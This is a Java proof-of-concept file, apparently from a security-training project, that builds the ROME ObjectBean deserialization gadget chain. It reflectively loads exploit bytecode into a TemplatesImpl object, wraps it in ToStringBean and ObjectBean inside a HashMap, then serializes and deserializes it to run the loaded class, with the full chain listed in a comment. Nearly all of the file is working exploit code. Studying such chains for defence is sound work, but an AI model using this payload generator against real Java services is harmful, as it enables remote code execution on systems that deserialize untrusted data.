package com.madaha.codesecone.controller.AdvancedAttack.deserialize.RomeDeserialize;

import com.rometools.rome.feed.impl.ObjectBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;


public class ROME_ObjectBean_PocTest {

    // 获取项目根目录，设置expPath;
    private static String projectRoot = System.getProperty("user.dir");
    private static String rome_ser_Path = projectRoot + "\\src\\main\\java\\com\\madaha\\codesecone\\controller\\AdvancedAttack\\deserialize\\RomeDeserialize\\ROME_Poc.ser";
    private static String TemplatesImpl_class_Path = projectRoot + "\\src\\main\\java\\com\\madaha\\codesecone\\controller\\AdvancedAttack\\deserialize\\Exploit\\TemplatesImpl_Exploit.class";


    // 反射修改 Field 方法；
    public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }

    // 序列化
    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(rome_ser_Path));
        objectOutputStream.writeObject(obj);
    }

    // 反序列化
    public static Object deserialize(String filePath) throws IOException, ClassNotFoundException {
        // ObjectInputStream objectInputStream = new ObjectInputStream(Files.newInputStream(Paths.get(filePath)));
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filePath));
        return objectInputStream.readObject();
    }

    /**
     *  * TemplatesImpl.getOutputProperties()
     *  * ToStringBean.toString(String)
     *  * ToStringBean.toString()
     *  * EqualsBean.beanHashCode()
     *  * ObjectBean.hashcode()
     *  * HashMap<K,V>.hash(Object)
     *  * HashMap<K,V>.readObject(ObjectInputStream)
     *
     * @throws Exception
     */

    public static void rome_ObjectBean_Poc() throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();

        byte[] bytecodes = Files.readAllBytes(Paths.get(TemplatesImpl_class_Path));

        setFieldValue(templatesimpl, "_name", "PocTest");
        setFieldValue(templatesimpl, "_bytecodes", new byte[][] {bytecodes});
        setFieldValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesimpl);
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(objectBean, "rome");

        // 序列化
        serialize(hashMap);

        // 反序列化
        deserialize(rome_ser_Path);
    }


    public static void main(String[] args) throws Exception {
        rome_ObjectBean_Poc();
    }
}
